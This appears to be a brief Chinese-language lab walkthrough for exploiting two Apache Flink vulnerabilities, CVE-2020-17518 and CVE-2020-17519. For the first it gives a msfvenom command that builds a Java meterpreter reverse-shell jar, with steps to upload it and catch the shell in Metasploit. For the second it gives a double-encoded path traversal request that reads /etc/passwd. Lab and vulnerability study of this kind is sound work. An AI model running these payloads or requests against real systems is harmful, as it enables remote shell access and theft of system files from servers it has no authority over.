1.Apache Flink Upload Path Traversal (CVE-2020-17518)

影响版本 : Flink 1.5.1-1.11.2
Path : flink/CVE-2020-17518
Vul : 文件上传
Breakthrough：

（a）msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=444 -f jar -o shell.jar – 上传生成的.jar文件 – 上传成功
（b）msf开启监听 – 前端Submit上传的.jar包 – msf这里使用shell命令getshell

2.Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)

影响版本 : Flink 1.11.0-1.11.2
Path : flink/CVE-2020-17519
Vul : 目录穿越
Breakthrough：

已经给出了存在目录穿越的目录jobmanager/logs – 访问http://<aim_ip>:<aim_port>/jobmanager/logs – bp拦截 – 修改GET参数为 /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd – 能够返回/etc/passwd文件内容
